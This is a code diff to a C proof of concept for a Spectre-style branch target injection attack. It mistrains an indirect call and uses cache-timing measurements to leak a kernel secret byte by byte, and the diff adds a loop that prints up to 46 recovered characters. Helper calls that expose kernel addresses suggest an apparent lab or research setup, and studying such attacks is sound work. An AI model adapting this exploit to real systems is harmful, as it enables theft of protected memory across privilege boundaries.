@@ -11,6 +11,8 @@
 #include <stdlib.h>
 #include "amd64.h"
 
+#define PRINT_DEBUG false
+
 #define USER_MASK ((1ull << 47) - 1) // 4 level paging => 48 bit va, top bit is kernel/user
 #define PAGE_BITS 12
 #define PAGE_SIZE (1ull << PAGE_BITS)
@@ -63,63 +65,12 @@ mmap_two_pages(u64 addr)
               0, 0);
 }
 
+int (*uv)(u8*, u64, int);
+u64 uga;
+
 int
-main(int argc, char *argv[])
+readByte(char *addrToRead, char result[2])
 {
-  u64 kva = get_victim_addr(); // need to mistrain this call
-  u64 kga = get_gadget_addr(); // to predict here
-  printf("kva: 0x%lx, kga: 0x%lx\n", kva, kga);
-  u64 ksa = get_safe_addr();
-
-  int kvoffset = get_victim_offset(); // offset to call instruction
-  printf("kvoffset: %d\n", kvoffset);
-
-  int uvoffset;
-  u8 *code = (u8*) &dummy_victim;
-  for (uvoffset = 0; *(code + uvoffset) != 0xff; uvoffset++);
-  printf("uvoffset: %d\n", uvoffset);
-
-  if (kvoffset != uvoffset) {
-    printf("kernel and user offsets don't match\n");
-    //return 1;
-  }
-
-  u64 uva = (kva & USER_MASK) + kvoffset - uvoffset;
-  printf("uva: 0x%lx\n", uva);
-
-  if (mmap_two_pages(uva) == MAP_FAILED) {
-    printf("mmap uva failed\n");
-    return 1;
-  }
-
-  u64 uga = kga & USER_MASK;
-  printf("uga: 0x%lx\n", uga);
-
-  if (mmap_two_pages(uga) == MAP_FAILED) {
-    printf("mmap uga failed\n");
-    return 1;
-  }
-
-  // size should be larger than function
-  void* dest = memcpy((void*) uva, (void*) &dummy_victim, 160);
-  if ((u64)dest != uva) {
-    printf("memcpy uva failed\n");
-    return 1;
-  }
-
-  // don't copy too much or else it will overwrite uva
-  dest = memcpy((void*) uga, (void*) &dummy_gadget, 20);
-  if ((u64)dest != uga) {
-    printf("memcpy uga failed\n");
-    return 1;
-  }
-
-  u64 ksecret = get_secret_addr();
-
-  auto uv = ((int (*)(u8*, u64, int)) uva);
-
-  //set_safe_addr(ksa);
-
   // see appendix C of https://spectreattack.com/spectre.pdf
   u8 *channel = (u8*) malloc(256 * GAP * sizeof(u8));
   int hits[256]; // record cache hits
@@ -171,7 +122,7 @@ main(int argc, char *argv[])
 
     // call victim
     //junk ^= victim(channel, 42, 0);
-    junk ^= victim(channel, (u8 *)ksecret, 0);
+    junk ^= victim(channel, (u8 *)addrToRead, 0);
     //printf("incorrect elapsed: %lu\n", elapsed);
 
     //junk ^= channel[250 * GAP];
@@ -194,8 +145,8 @@ main(int argc, char *argv[])
   // locate top two results
   j = k = -1;
   for (i = 0; i < 256; i++) {
-    if (hits[i] > 0)
-      printf("i: %d, hits: %d\n", i, hits[i]);
+    if (PRINT_DEBUG && hits[i] > 0)
+      printf("hit %d: %d\n", i, hits[i]);
 
     if (j < 0 || hits[i] >= hits[j]) {
       k = j;
@@ -206,12 +157,93 @@ main(int argc, char *argv[])
   }
   if ((hits[j] >= 2 * hits[k] + 5) ||
       (hits[j] == 2 && hits[k] == 0)) {
-    printf("hit: %d\n", j);
+    result[0] = (char)j;
+    result[1] = 1;
   } else {
-    printf("no hit\n");
+    result[0] = 0;
+    result[1] = 0;
   }
 
-  printf("junk: %d\n", junk); // prevent junk from being optimized out
+  free(channel);
+  return junk; // prevent junk from being optimized out
+}
+
+int
+main(int argc, char *argv[])
+{
+  u64 kva = get_victim_addr(); // need to mistrain this call
+  u64 kga = get_gadget_addr(); // to predict here
+  if (PRINT_DEBUG)
+    printf("kva: 0x%lx, kga: 0x%lx\n", kva, kga);
+  u64 ksa = get_safe_addr();
+
+  int kvoffset = get_victim_offset(); // offset to call instruction
+  if (PRINT_DEBUG)
+    printf("kvoffset: %d\n", kvoffset);
+
+  int uvoffset;
+  u8 *code = (u8*) &dummy_victim;
+  for (uvoffset = 0; *(code + uvoffset) != 0xff; uvoffset++);
+  if (PRINT_DEBUG)
+    printf("uvoffset: %d\n", uvoffset);
+
+  if (PRINT_DEBUG && kvoffset != uvoffset) {
+    printf("kernel and user offsets don't match\n");
+    //return 1;
+  }
+
+  u64 uva = (kva & USER_MASK) + kvoffset - uvoffset;
+  if (PRINT_DEBUG)
+    printf("uva: 0x%lx\n", uva);
+
+  if (mmap_two_pages(uva) == MAP_FAILED) {
+    printf("mmap uva failed\n");
+    return 1;
+  }
+
+  uga = kga & USER_MASK;
+  if (PRINT_DEBUG)
+    printf("uga: 0x%lx\n", uga);
+
+  if (mmap_two_pages(uga) == MAP_FAILED) {
+    printf("mmap uga failed\n");
+    return 1;
+  }
+
+  // size should be larger than function
+  void* dest = memcpy((void*) uva, (void*) &dummy_victim, 160);
+  if ((u64)dest != uva) {
+    printf("memcpy uva failed\n");
+    return 1;
+  }
+
+  // don't copy too much or else it will overwrite uva
+  dest = memcpy((void*) uga, (void*) &dummy_gadget, 20);
+  if ((u64)dest != uga) {
+    printf("memcpy uga failed\n");
+    return 1;
+  }
+
+  u64 ksecret = get_secret_addr();
+
+  uv = ((int (*)(u8*, u64, int)) uva);
+
+  //set_safe_addr(ksa);
+  char result[2];
+  int junk = 0;
+  int index = 0;
+  while (index < 46) {
+    junk += readByte(((char*) ksecret) + index, result);
+    if (result[1] == 1) {
+      if (result[0] == 0)
+        break;
+      printf("%c", result[0]);
+    } else {
+      printf("?");
+    }
+    index++;
+  }
+  printf("\ndone! (junk: %d)\n", junk);
   return 0;
 }
 
